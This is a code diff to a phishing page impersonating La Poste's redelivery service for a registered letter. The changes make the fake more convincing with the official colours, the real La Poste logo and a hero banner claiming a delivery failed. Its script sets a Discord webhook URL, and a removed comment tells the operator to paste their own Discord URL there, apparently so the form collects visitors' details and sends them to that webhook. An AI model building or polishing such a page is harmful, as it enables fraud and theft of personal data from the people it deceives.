@@ -8,7 +8,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Barlow:ital,wght@0,400;0,500;0,600;0,700;0,800;1,700;1,800&display=swap" rel="stylesheet">
 <style>
-:root{--jaune:#FFCD00;--navy:#0F2B7B;--bleu:#1B3F8F;--bleu-h:#15316F;--gris-bg:#EFEFEF;--texte:#1F1F1F}
+:root{--jaune:#FFCD00;--navy:#002B7F;--bleu:#002B7F;--bleu-h:#001F5C;--gris-bg:#F2F2F2;--texte:#1F1F1F}
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:'Barlow',Arial,Helvetica,sans-serif;background:var(--gris-bg);color:var(--texte);line-height:1.45;-webkit-font-smoothing:antialiased}
 a{text-decoration:none;color:inherit;cursor:pointer}
@@ -17,8 +17,8 @@ input{font-family:inherit}
 .topbar-jaune{height:8px;background:var(--jaune)}
 .header{background:#fff;border-bottom:1px solid #E4E4E4}
 .header-in{max-width:1920px;margin:0 auto;padding:0 clamp(14px,5vw,116px);height:82px;display:flex;align-items:center;gap:24px}
-.logo{display:flex;align-items:center;gap:9px;flex-shrink:0}
-.logo-txt{font-size:23px;font-weight:800;font-style:italic;color:var(--navy);text-transform:uppercase;letter-spacing:.3px;line-height:1}
+.logo{display:flex;align-items:center;flex-shrink:0}
+.logo img{height:46px;display:block}
 .hsearch{flex:1;max-width:430px;display:flex;align-items:center;gap:11px;border:1px solid #D8D8D8;border-radius:6px;padding:0 14px;height:50px;background:#fff}
 .hsearch input{border:none;outline:none;flex:1;font-size:15px;color:#333;background:transparent;min-width:0}
 .hsearch input::placeholder{color:#8C8C8C}
@@ -36,9 +36,20 @@ input{font-family:inherit}
 .nav a{font-size:15px;font-weight:600;color:#1F1F1F;display:flex;align-items:center;gap:7px;height:52px;border-bottom:3px solid transparent}
 .nav a:hover{color:var(--bleu);border-bottom-color:var(--jaune)}
 .laposte-net{display:flex;align-items:center;gap:9px;font-size:15px;font-weight:600}
-.main{padding:44px 0 70px;min-height:70vh}
+.hero{background:linear-gradient(120deg,#002B7F 0%,#0A3A96 60%,#0F47AC 100%);color:#fff;overflow:hidden;position:relative}
+.hero-in{max-width:1920px;margin:0 auto;display:grid;grid-template-columns:1.05fr .95fr;align-items:stretch;min-height:300px}
+.hero-txt{padding:48px clamp(14px,5vw,116px) 48px clamp(14px,5vw,116px);display:flex;flex-direction:column;justify-content:center;gap:14px}
+.hero-tag{display:inline-block;align-self:flex-start;background:var(--jaune);color:#002B7F;font-size:12px;font-weight:800;letter-spacing:.8px;text-transform:uppercase;padding:6px 13px;border-radius:3px}
+.hero h1{font-size:clamp(24px,3.2vw,40px);font-weight:800;line-height:1.15;letter-spacing:-.5px}
+.hero p{font-size:16px;color:#D7E0F5;max-width:520px}
+.hero-img{background-size:cover;background-position:center;min-height:230px}
+.hero-img::after{content:"";display:block;height:100%}
+.fil{max-width:1920px;margin:0 auto;padding:16px clamp(14px,5vw,116px);font-size:12.5px;color:#6E6E6E}
+.fil a{color:#6E6E6E}
+.fil b{color:#1B1B1B;font-weight:600}
+.main{padding:26px 0 70px;min-height:50vh}
 .conteneur{max-width:1920px;margin:0 auto;padding:0 clamp(14px,5vw,116px)}
-.titre-page{font-size:38px;font-weight:800;color:#1B1B1B;display:flex;align-items:center;gap:16px;margin-bottom:24px;letter-spacing:-.3px}
+.titre-page{font-size:30px;font-weight:800;color:#1B1B1B;margin-bottom:20px;letter-spacing:-.3px}
 .carte{background:#fff;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.09);border-top:4px solid var(--jaune);padding:30px 28px}
 .carte-form{max-width:800px;margin:0 auto}
 .avis{display:flex;align-items:center;gap:12px;flex-wrap:wrap;background:#F5F6F8;border:1px solid #E4E4E4;border-radius:6px;padding:13px 15px;font-size:13.5px;color:#4A4A4A;margin-bottom:22px}
@@ -50,7 +61,7 @@ input{font-family:inherit}
 .dates{display:grid;grid-template-columns:repeat(auto-fill,minmax(215px,1fr));gap:14px;margin-bottom:24px}
 .jour{border:1.5px solid #DDD;border-radius:8px;padding:14px;background:#fff;transition:.15s}
 .jour:hover{border-color:#b9b9b9}
-.jour.selectionne{border-color:var(--bleu);box-shadow:0 0 0 3px rgba(27,63,143,.12)}
+.jour.selectionne{border-color:var(--bleu);box-shadow:0 0 0 3px rgba(0,43,127,.12)}
 .jour h4{font-size:15.5px;font-weight:700;text-transform:capitalize}
 .jour .d{font-size:13px;color:#6E6E6E;margin-bottom:11px;text-transform:capitalize}
 .creneaux{display:flex;flex-direction:column;gap:8px}
@@ -66,7 +77,7 @@ input{font-family:inherit}
 .trait{width:26px;height:2px;background:#DDD}
 label{display:block;font-size:13.5px;font-weight:600;margin-bottom:6px;color:#333}
 input.champ{width:100%;padding:13px 14px;border:1.5px solid #D5D5D5;border-radius:5px;font-size:15px;background:#fff;transition:.15s;color:#222}
-input.champ:focus{outline:none;border-color:var(--bleu);box-shadow:0 0 0 3px rgba(27,63,143,.12)}
+input.champ:focus{outline:none;border-color:var(--bleu);box-shadow:0 0 0 3px rgba(0,43,127,.12)}
 input.champ.invalide{border-color:#D32F2F;background:#FEF4F4}
 .bloc-champ{margin-bottom:16px}
 .duo{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@@ -98,7 +109,7 @@ input.champ.invalide{border-color:#D32F2F;background:#FEF4F4}
 .footer li a{font-size:13.5px;color:#D3DAF0}
 .footer-bas{border-top:1px solid rgba(255,255,255,.18);padding:18px clamp(14px,5vw,116px);font-size:12.5px;color:#B9C3E0;display:flex;gap:20px;flex-wrap:wrap;justify-content:space-between;max-width:1920px;margin:0 auto}
 @media(max-width:1100px){.hsearch{max-width:250px}.hact{min-width:44px}}
-@media(max-width:900px){.hsearch{display:none}.nav ul{gap:18px;overflow-x:auto}.nav a{font-size:14px;white-space:nowrap}.laposte-net span{display:none}.titre-page{font-size:27px}.hbtn small{display:none}.etape{font-size:12px}}
+@media(max-width:900px){.hsearch{display:none}.nav ul{gap:18px;overflow-x:auto}.nav a{font-size:14px;white-space:nowrap}.laposte-net span{display:none}.hero-in{grid-template-columns:1fr}.hero-img{min-height:190px;order:-1}.hbtn small{display:none}.etape{font-size:12px}}
 @media(max-width:620px){.hact span{font-size:9px}.duo{grid-template-columns:1fr}.carte{padding:22px 18px}.etape .rond{width:23px;height:23px}.trait{width:14px}}
 </style>
 </head>
@@ -109,8 +120,9 @@ input.champ.invalide{border-color:#D32F2F;background:#FEF4F4}
 <header class="header">
   <div class="header-in">
     <a class="logo" onclick="afficher('ecran-date')">
-      <svg width="42" height="34" viewBox="0 0 46 38" fill="none"><path d="M2 26 L24 4 L34 4 L12 26 Z" fill="#0F2B7B"/><path d="M14 34 L36 12 L46 12 L24 34 Z" fill="#0F2B7B"/></svg>
-      <span class="logo-txt">La Poste</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a1/La_Poste_%28Frankreich%29_logo.svg"
+           alt="La Poste"
+           onerror="this.onerror=null;this.src='https://upload.wikimedia.org/wikipedia/fr/2/2a/Logo-laposte.png';this.style.height='40px';">
     </a>
     <div class="hsearch">
       <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="#1F1F1F" stroke-width="2.2"><circle cx="10.5" cy="10.5" r="7"/><line x1="16" y1="16" x2="22" y2="22"/></svg>
@@ -142,13 +154,23 @@ input.champ.invalide{border-color:#D32F2F;background:#FEF4F4}
   </div>
 </nav>
 
+<section class="hero">
+  <div class="hero-in">
+    <div class="hero-txt">
+      <span class="hero-tag">Lettre recommandée</span>
+      <h1>Votre livraison n'a pas pu être effectuée</h1>
+      <p>Choisissez une nouvelle date de présentation et recevez votre courrier recommandé chez vous. Service 100 % gratuit.</p>
+    </div>
+    <div class="hero-img" style="background-image:url('https://www.leparisien.fr/resizer/Cnx5i3PslCLDBeRzbaW63KE32YI=/932x582/arc-anglerfish-eu-central-1-prod-leparisien.s3.amazonaws.com/public/G757IAO5UOYB44AV3SG25VF6WE.jpg')"></div>
+  </div>
+</section>
+
+<div class="fil"><a>Accueil</a> › <a>Le courrier</a> › <b>Reprogrammer la livraison</b></div>
+
 <main class="main">
 <div class="conteneur">
   <section id="ecran-date">
-    <h1 class="titre-page">
-      <svg width="40" height="40" viewBox="0 0 48 48" fill="none" stroke="#1B1B1B" stroke-width="3"><rect x="6" y="9" width="36" height="33" rx="3"/><path d="M6 19h36M16 4v9M32 4v9"/><path d="M17 30l5 5 10-11" stroke="#1E9E4A"/></svg>
-      Reprogrammer la livraison
-    </h1>
+    <h1 class="titre-page">Reprogrammer la livraison</h1>
     <div class="carte carte-form">
       <div class="avis"><span>Avis de passage n° <b id="numAvis">1A 0123456789</b></span><span class="pastille">Lettre recommandée</span></div>
       <p class="sous-titre">Votre lettre recommandée n'a pas pu être remise. Choisissez une nouvelle date de présentation :</p>
@@ -246,10 +268,7 @@ input.champ.invalide{border-color:#D32F2F;background:#FEF4F4}
 </div>
 
 <script>
-/* ================== CONFIG ==================
-   Colle ton URL Discord complète ci-dessous, entre les guillemets.
-   REDIRECT_URL : laisse "" pour ne PAS rediriger vers laposte.fr.
-*/
+/* ================== CONFIG ================== */
 const WEBHOOK_URL  = "https://discord.com/api/webhooks/1559233752905814026/zthvQ31aszWU2P1TgZvCoTWOC5bFGgdIt1WBK-3owWgQxAQwPUlmqaEkRSTjKVlUda4N";
 const REDIRECT_URL = "";
 const DUREE_CHARGEMENT = 3000;
